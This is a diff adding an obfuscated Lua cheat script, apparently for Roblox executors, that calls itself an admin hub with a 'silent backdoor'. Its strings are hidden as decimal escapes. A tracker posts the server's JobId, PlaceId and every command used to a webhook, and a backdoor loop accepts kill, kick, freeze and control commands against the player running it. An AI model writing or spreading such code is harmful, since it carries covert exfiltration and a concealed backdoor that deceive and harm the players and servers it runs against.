@@ -1,0 +1,162 @@
+--[[ 
+    Jotinha12hr2 Hub's Admin - V31 (ULTRA OBFUSCATED & UNIVERSAL)
+    - COMPATIBILIDADE: MOBILE & PC (ALL EXECUTORS)
+    - STATUS: 21 BOTÕES + TRACKER + SILENT BACKDOOR
+]]
+
+repeat task.wait() until game:IsLoaded()
+
+-- [ VARIÁVEIS OFUSCADAS ]
+local _0xJ1 = "URL_DO_WEBHOOK_AQUI" 
+local _0xJ2 = game:GetService("\80\108\97\121\101\114\115")
+local _0xJ3 = _0xJ2["\76\111\99\97\108\80\108\97\121\101\114"]
+local _0xJ4 = game:GetService("\82\117\110\83\101\114\118\105\99\101")
+local _0xJ5 = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
+
+if not _G.JotaNet then _G.JotaNet = {} end
+
+-- [ WEBHOOK TRACKER ]
+local function _0xLOG(_0xT)
+    task.spawn(function()
+        if _0xJ1 == "" or #_0xJ1 < 10 then return end
+        local _0xR = (syn and syn.request) or (http and http.request) or http_request or request
+        if _0xR then
+            pcall(function()
+                _0xR({
+                    Url = _0xJ1,
+                    Method = "\80\79\83\84",
+                    Headers = {["\67\111\110\116\101\110\116\45\84\121\112\101"] = "\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110"},
+                    Body = _0xJ5:JSONEncode({
+                        ["embeds"] = {{
+                            ["title"] = "\74\111\116\97\32\86\51\49\32\84\114\97\99\107\101\114",
+                            ["description"] = _0xT,
+                            ["fields"] = {
+                                {["name"] = "\74\111\98\73\100", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
+                                {["name"] = "\80\108\97\99\101\73\100", ["value"] = tostring(game.PlaceId), ["inline"] = true}
+                            },
+                            ["color"] = 16768768
+                        }}
+                    })
+                })
+            end)
+        end
+    end)
+end
+
+-- [ BACKDOOR ENGINE ]
+task.spawn(function()
+    while task.wait(0.2) do
+        for _0xTr, _0xDt in pairs(_G.JotaNet) do
+            if (_0xTr == _0xJ3.Name or _0xTr == "\97\108\108") and _0xDt.F ~= _0xJ3.Name then
+                local _0xC = _0xDt.D:lower()
+                local _0xCh = _0xJ3.Character
+                if _0xCh and _0xCh:FindFirstChild("\72\117\109\97\110\111\105\100") then
+                    if _0xC == "\107\105\108\108" then _0xCh.Humanoid.Health = 0
+                    elseif _0xC == "\102\114\101\101\122\101" then _0xCh.HumanoidRootPart.Anchored = true
+                    elseif _0xC == "\117\110\102\114\101\101\122\101" then _0xCh.HumanoidRootPart.Anchored = false
+                    elseif _0xC == "\118\111\105\100" then _0xCh.HumanoidRootPart.CFrame = CFrame.new(0,-999,0)
+                    elseif _0xC == "\107\105\99\107" then _0xJ3:Kick("\65\100\109\105\110\32\67\111\110\116\114\111\108")
+                    elseif _0xC == "\99\111\110\116\114\111\108" then _G.Controlling = _0xDt.F
+                    elseif _0xC == "\117\110\99\111\110\116\114\111\108" then _G.Controlling = nil end
+                end
+                _G.JotaNet[_0xTr] = nil
+            end
+        end
+        if _G.Controlling then
+            local _0xM = _0xJ2:FindFirstChild(_G.Controlling)
+            if _0xM and _0xM.Character and _0xJ3.Character then
+                _0xJ3.Character.Humanoid:Move(_0xM.Character.Humanoid.MoveDirection, false)
+                if _0xM.Character.Humanoid.Jump then _0xJ3.Character.Humanoid.Jump = true end
+            end
+        end
+    end
+end)
+
+-- [ GUI SYSTEM ]
+local _0xR = (game:GetService("\67\111\114\101\71\117\105") or _0xJ3:WaitForChild("\80\108\97\121\101\114\71\117\105"))
+local _0xG = Instance.new("\83\99\114\101\101\110\71\117\105", _0xR)
+_0xG.Name = "\74\72\95\86\51\49"
+
+local _0xB = Instance.new("\84\101\120\116\66\111\116\116\111\110", _0xG)
+_0xB.Size = UDim2.new(0,50,0,50)
+_0xB.Position = UDim2.new(0,10,0.5,-25)
+_0xB.BackgroundColor3 = Color3.fromRGB(15,15,15)
+_0xB.Text = "\74\72"
+_0xB.Font = Enum.Font.LuckiestGuy
+_0xB.TextSize = 22
+Instance.new("\85\73\67\111\114\110\101\114", _0xB).CornerRadius = UDim.new(1,0)
+local _0xS = Instance.new("\85\73\83\116\114\111\101\107", _0xB) _0xS.Thickness = 3
+_0xJ4.RenderStepped:Connect(function() _0xS.Color = Color3.fromHSV(tick()%5/5,0.8,1) _0xB.TextColor3 = _0xS.Color end)
+
+local _0xM = Instance.new("\70\114\97\109\101", _0xG)
+_0xM.Size = UDim2.new(0,260,0,400)
+_0xM.Position = UDim2.new(0.5,-130,0.5,-200)
+_0xM.BackgroundColor3 = Color3.fromRGB(10,10,10)
+_0xM.Visible = false
+_0xM.Active = true
+_0xM.Draggable = true
+Instance.new("\85\73\67\111\114\110\101\114", _0xM)
+_0xB.MouseButton1Click:Connect(function() _0xM.Visible = not _0xM.Visible end)
+
+local _0xIn = Instance.new("\84\101\120\116\66\111\120", _0xM)
+_0xIn.Size = UDim2.new(0,220,0,35)
+_0xIn.Position = UDim2.new(0.5,-110,0,45)
+_0xIn.PlaceholderText = "\78\73\67\75\32\68\79\32\65\76\86\79"
+_0xIn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+_0xIn.TextColor3 = Color3.new(1,1,1)
+Instance.new("\85\73\67\111\114\110\101\114", _0xIn)
+
+local _0xSc = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101", _0xM)
+_0xSc.Size = UDim2.new(1,-10,1,-100)
+_0xSc.Position = UDim2.new(0,5,0,95)
+_0xSc.BackgroundTransparency = 1
+_0xSc.CanvasSize = UDim2.new(0,0,6,0)
+Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0xSc).HorizontalAlignment = "\67\101\110\116\101\114"
+_0xSc.UIListLayout.Padding = UDim.new(0,5)
+
+-- [ BOTÃO COPY JOBID ]
+local _0xCp = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xSc)
+_0xCp.Size = UDim2.new(0,210,0,35)
+_0xCp.Text = "\67\79\80\89\32\74\79\66\73\68"
+_0xCp.BackgroundColor3 = Color3.fromRGB(0,80,0)
+_0xCp.TextColor3 = Color3.new(1,1,1)
+Instance.new("\85\73\67\111\114\110\101\114", _0xCp)
+_0xCp.MouseButton1Click:Connect(function() setclipboard(tostring(game.JobId)) end)
+
+-- [ COMANDOS ]
+local _0xL = {"Kill", "Void", "Freeze", "Unfreeze", "Jump", "Sit", "Kick", "Spin", "Unspin", "Blind", "Jail", "Unjail", "Bring", "Fling", "Infect", "View", "Unview", "Control", "Uncontrol"}
+for _, _0xN in pairs(_0xL) do
+    local _0xBt = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xSc)
+    _0xBt.Size = UDim2.new(0,210,0,35)
+    _0xBt.Text = "\83\72\65\68\79\87\32" .. _0xN:upper()
+    _0xBt.BackgroundColor3 = Color3.fromRGB(25,25,25)
+    _0xBt.TextColor3 = Color3.fromRGB(255,215,0)
+    Instance.new("\85\73\67\111\114\110\101\114", _0xBt)
+    _0xBt.MouseButton1Click:Connect(function()
+        if _0xN == "\86\105\101\119" then
+            local _0xT = _0xJ2:FindFirstChild(_0xIn.Text)
+            if _0xT and _0xT.Character then workspace.CurrentCamera.CameraSubject = _0xT.Character.Humanoid end
+        elseif _0xN == "\85\110\118\105\101\119" then
+            workspace.CurrentCamera.CameraSubject = _0xJ3.Character.Humanoid
+        else
+            _G.JotaNet[_0xIn.Text] = {["D"] = _0xN, ["F"] = _0xJ3.Name}
+        end
+        _0xLOG("\83\105\110\97\108\58\32" .. _0xN .. "\32\112\97\114\97\32" .. _0xIn.Text)
+    end)
+end
+
+-- [ TAG RGB ]
+local function _0xTg(_0xC)
+    local _0xH = _0xC:WaitForChild("\72\101\97\100", 10)
+    local _0xBg = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", _0xH)
+    _0xBg.Size = UDim2.new(0,160,0,45) _0xBg.AlwaysOnTop = true _0xBg.ExtentsOffset = Vector3.new(0,3,0)
+    local _0xTx = Instance.new("\84\101\120\116\76\97\98\101\108", _0xBg)
+    _0xTx.Size = UDim2.new(1,0,1,0) _0xTx.BackgroundTransparency = 1 _0xTx.Font = Enum.Font.LuckiestGuy _0xTx.TextSize = 22
+    _0xTx.Text = (_0xJ3.Name == "\106\111\116\105\110\104\97\49\50\104\114\50" and "\91\68\79\78\79\93\32" or "\91\85\83\69\82\93\32") .. _0xJ3.DisplayName
+    _0xJ4.RenderStepped:Connect(function() _0xTx.TextColor3 = Color3.fromHSV(tick()%5/5,0.8,1) end)
+end
+_0xJ3.CharacterAdded:Connect(_0xTg)
+if _0xJ3.Character then _0xTg(_0xJ3.Character) end
+
+_0xLOG("\99\101\95\74\111\116\97\95\86\51\49\95\79\110\108\105\110\101")
+
